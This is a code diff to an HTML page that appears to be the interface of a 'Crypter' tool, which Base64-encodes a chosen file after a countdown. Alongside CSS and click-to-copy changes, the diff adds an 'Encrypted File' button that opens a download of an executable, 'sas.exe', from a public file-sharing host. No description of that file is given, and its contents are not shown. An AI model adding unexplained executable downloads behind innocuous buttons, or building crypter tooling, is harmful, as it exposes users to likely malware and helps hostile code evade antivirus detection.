@@ -21,7 +21,7 @@
         h1 {
             margin-bottom: 30px;
         }
-        #choose-file-button, #encrypt-button, #crypter-button {
+        #choose-file-button, #encrypt-button, #crypter-button, #encrypted-file-button {
             padding: 15px 30px;
             font-size: 18px;
             border: none;
@@ -51,6 +51,13 @@
         #crypter-button:hover {
             background-color: #ff6347; /* Darker orange on hover */
         }
+        #encrypted-file-button {
+            background-color: #1e90ff; /* Blue theme */
+            color: white;
+        }
+        #encrypted-file-button:hover {
+            background-color: #00bfff; /* Darker blue on hover */
+        }
         input[type="file"] {
             display: none; /* Hides the file input */
         }
@@ -58,6 +65,7 @@
             margin-top: 20px;
             font-size: 18px;
             color: #ffeb3b; /* Yellow color for file name and output */
+            cursor: pointer; /* Change cursor to indicate clickable */
         }
         #countdown {
             margin-top: 10px;
@@ -74,11 +82,14 @@
 
     <button id="encrypt-button">Encrypt</button>
     <button id="crypter-button">Crypter</button>
+    <button id="encrypted-file-button">Encrypted File</button>
     <div id="countdown"></div>
 
     <!-- Box to display the selected file name -->
     <div id="file-name">No file chosen</div>
-    <div id="base64-output"></div> <!-- Output for Base64 encoded file -->
+    
+    <!-- Output for Base64 encoded file with a click-to-copy functionality -->
+    <div id="base64-output" onclick="copyToClipboard()" title="Click to copy to clipboard">Base64 Encoded File: Click to Generate</div> 
 
     <script>
         let selectedFile;
@@ -89,7 +100,7 @@
             if (this.files.length > 0) {
                 selectedFile = this.files[0]; // Store the selected file
                 fileNameDisplay.textContent = "Selected file: " + selectedFile.name;
-                document.getElementById("base64-output").textContent = ""; // Clear previous output
+                document.getElementById("base64-output").textContent = "Base64 Encoded File: Click to Generate"; // Reset output
             } else {
                 fileNameDisplay.textContent = "No file chosen";
             }
@@ -138,7 +149,7 @@
 
                     reader.onload = function(event) {
                         const base64String = event.target.result.split(',')[1]; // Get Base64 part
-                        document.getElementById("base64-output").textContent = "Base64 Encoded File: " + base64String;
+                        document.getElementById("base64-output").textContent = "Base64 Encoded File: " + base64String; // Show Base64 encoded string
                     };
 
                     // Read the file as a Data URL (Base64)
@@ -146,6 +157,21 @@
                     countdownDisplay.textContent = ""; // Clear countdown message
                 }
             }, 1000); // Update every second
+        });
+
+        // Function to copy Base64 string to clipboard
+        function copyToClipboard() {
+            const base64Output = document.getElementById("base64-output").textContent.split(': ')[1];
+            navigator.clipboard.writeText(base64Output).then(() => {
+                alert("Base64 encoded string copied to clipboard!");
+            }).catch(err => {
+                console.error('Error copying to clipboard: ', err);
+            });
+        }
+
+        // Add event listener for the encrypted file button
+        document.getElementById("encrypted-file-button").addEventListener("click", function() {
+            window.open("https://www.upload.ee/download/17207934/b3663201d1ce1f8adc83/sas.exe", "_blank");
         });
     </script>
 
